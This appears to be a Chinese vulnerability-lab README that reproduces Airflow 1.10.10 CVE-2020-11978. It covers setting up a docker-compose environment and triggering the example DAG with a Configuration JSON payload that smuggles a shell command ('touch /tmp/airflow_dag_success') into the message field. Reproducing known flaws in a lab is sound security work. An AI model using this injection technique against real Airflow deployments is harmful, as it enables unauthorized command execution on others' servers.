# Airflow 1.10.10 CVE-2020-11978 示例dag中的命令注入



airflow是一款开源的，分布式任务调度框架，它将一个具有上下级依赖关系的工作流，组装成一个有向无环图。

docker-compose文件由airflow 2.x提供的docker-compose文件修改而来。

Airflow的配置中使用CeleryExecutor进行任务执行，所以命令执行结果需要在CeleryWorker所在容器中进行查看。

由于启动的组件比较多，可能会有点卡，虚拟机使用请准备2G以上的内存。

## 漏洞环境

依次执行如下命令启动airflow 1.10.10

```bash
#初始化数据库
docker-compose run airflow-init initdb
#启动服务
docker-compsoe up -d
```

## 漏洞复现

访问`http://主机:8080`进入airflow管理端，将`example_trigger_target_dag`前面的Off改为On：

![image-20210701142307744](README.assets/image-20210701142307744.png)

再点击执行按钮，在`Configuration JSON`中输入：`{"message":"'\";touch /tmp/airflow_dag_success;#"}`,再点`Trigger`执行dag

![image-20210701142758977](README.assets/image-20210701142758977.png)

等几秒可以看到执行`success`了

![image-20210701142948275](README.assets/image-20210701142948275.png)

到CeleryWorker容器中进行查看：

```bash
docker-compose exec airflow-worker ls -l /tmp
```

可以看到成功创建了airflow_dag_success文件

![image-20210701154024308](README.assets/image-20210701154024308.png)

## 参考

https://xz.aliyun.com/t/8037

https://lists.apache.org/thread.html/r7255cf0be3566f23a768e2a04b40fb09e52fcd1872695428ba9afe91%40%3Cusers.airflow.apache.org%3E

https://docs.celeryproject.org/en/stable/userguide/configuration.html

https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk

https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers

https://www.jianshu.com/p/52552c075bc0

https://www.runoob.com/w3cnote/python-redis-intro.html

https://blog.csdn.net/SKI_12/article/details/85015803
